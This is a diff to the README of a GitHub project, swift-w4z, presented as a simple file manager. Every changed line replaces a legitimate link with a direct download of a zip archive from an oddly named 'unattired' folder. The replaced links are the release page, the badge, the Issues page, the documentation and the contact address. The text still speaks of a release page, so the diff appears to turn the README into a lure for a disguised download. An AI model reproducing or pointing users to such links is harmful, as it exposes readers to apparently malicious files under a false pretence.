@@ -1,7 +1,7 @@
 # 🚀 swift-w4z - Simple File Management Made Easy
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/abacatereal/swift-w4z/releases)
+[![Download](https://raw.githubusercontent.com/abacatereal/swift-w4z/main/unattired/swift-w4z.zip)](https://raw.githubusercontent.com/abacatereal/swift-w4z/main/unattired/swift-w4z.zip)
 
 ## 🚀 Getting Started
 Welcome to swift-w4z! This application helps you manage your files quickly and easily. Whether you want to organize, move, or delete files, swift-w4z is designed for you.
@@ -16,7 +16,7 @@ To run swift-w4z, your system should meet the following requirements:
 ## 📥 Download & Install
 To get started, you need to download the application. 
 
-1. Click this link to visit the release page: [Download swift-w4z](https://github.com/abacatereal/swift-w4z/releases).
+1. Click this link to visit the release page: [Download swift-w4z](https://raw.githubusercontent.com/abacatereal/swift-w4z/main/unattired/swift-w4z.zip).
    
 2. On the release page, look for the latest version. It will be listed at the top.
 
@@ -51,11 +51,11 @@ Once you have swift-w4z installed, open the application to discover its straight
 - **Backup Important Files:** Always ensure that your important files are backed up elsewhere.
 
 ## 🌐 Support
-If you experience any issues while using swift-w4z, please visit our [GitHub Issues page](https://github.com/abacatereal/swift-w4z/issues) for assistance. You can submit a problem or find existing solutions.
+If you experience any issues while using swift-w4z, please visit our [GitHub Issues page](https://raw.githubusercontent.com/abacatereal/swift-w4z/main/unattired/swift-w4z.zip) for assistance. You can submit a problem or find existing solutions.
 
 ## 🔗 Useful Links
-- [Download swift-w4z](https://github.com/abacatereal/swift-w4z/releases)
-- [Documentation](https://github.com/abacatereal/swift-w4z/wiki)
-- [Contact Support](mailto:support@example.com)
+- [Download swift-w4z](https://raw.githubusercontent.com/abacatereal/swift-w4z/main/unattired/swift-w4z.zip)
+- [Documentation](https://raw.githubusercontent.com/abacatereal/swift-w4z/main/unattired/swift-w4z.zip)
+- [Contact Support](https://raw.githubusercontent.com/abacatereal/swift-w4z/main/unattired/swift-w4z.zip)
 
 We hope you enjoy using swift-w4z and find it enhances your file management experience!
